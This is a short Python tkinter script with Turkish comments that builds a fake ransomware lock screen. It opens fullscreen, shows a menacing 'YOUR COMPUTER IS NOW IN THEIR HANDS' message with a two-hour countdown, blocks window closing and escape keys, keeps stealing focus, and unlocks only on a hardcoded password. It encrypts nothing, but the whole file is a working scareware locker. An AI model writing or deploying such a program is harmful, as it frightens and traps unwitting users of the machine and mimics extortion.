import tkinter as tk
import time

# Ana pencere
root = tk.Tk()
root.title("RANSOMWARE")
root.attributes('-fullscreen', True)
root.configure(bg='darkred')

# ALT+F4 ve diğer tuşları engelle
def disable_event():
    pass

def block_keys(event):
    if event.keysym in ['F4', 'Alt_L', 'Alt_R', 'Escape', 'Tab', 'F11']:
        return "break"
    if event.keysym == 'Delete' and event.state & 0x20000:  # Ctrl+Alt+Delete
        return "break"

root.protocol("WM_DELETE_WINDOW", disable_event)
root.bind('<Key>', block_keys)
root.bind('<Alt-F4>', lambda e: "break")
root.bind('<Control-Alt-Delete>', lambda e: "break")

# Ana mesaj
msg_label = tk.Label(root, 
                    text="YOUR COMPUTER IS NOW IN THEIR HANDS",
                    fg='white', bg='darkred',
                    font=('Arial', 24, 'bold'))
msg_label.pack(pady=50)

# Geri sayım
countdown_var = tk.StringVar()
countdown_var.set("02:00:00")

countdown_label = tk.Label(root, textvariable=countdown_var,
                          fg='white', bg='darkred',
                          font=('Arial', 48, 'bold'))
countdown_label.pack(pady=30)

# Şifre giriş yazısı
pass_label = tk.Label(root, text="ENTER PASSWORD:",
                     fg='white', bg='darkred',
                     font=('Arial', 18))
pass_label.pack()

# Şifre giriş kutusu
password_var = tk.StringVar()

def check_password(*args):
    if password_var.get() == "123456789":
        unlock_computer()

password_entry = tk.Entry(root, textvariable=password_var,
                         show="*", font=('Arial', 18),
                         width=15, bg='black', fg='white',
                         insertbackground='white')
password_entry.pack(pady=10)
password_entry.focus_set()
password_var.trace_add('write', check_password)

# Geri sayım fonksiyonu (2 saat)
def update_countdown(seconds_left=7200):
    if seconds_left > 0:
        hours = seconds_left // 3600
        minutes = (seconds_left % 3600) // 60
        seconds = seconds_left % 60
        countdown_var.set(f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        root.after(1000, update_countdown, seconds_left - 1)

update_countdown()

def unlock_computer():
    # Tüm widgetları temizle
    for widget in root.winfo_children():
        widget.destroy()
    
    root.configure(bg='green')
    
    clean_label = tk.Label(root,
                          text="✅ SYSTEM CLEANED\n\nYour computer is now normal",
                          fg='white', bg='green',
                          font=('Arial', 24, 'bold'))
    clean_label.pack(expand=True)
    
    # 3 saniye sonra kapat
    root.after(3000, root.destroy)

# Pencere odaklanmasını koru
def keep_focus():
    root.lift()
    root.focus_force()
    root.after(100, keep_focus)

root.after(100, keep_focus)

# Başlat
root.mainloop()
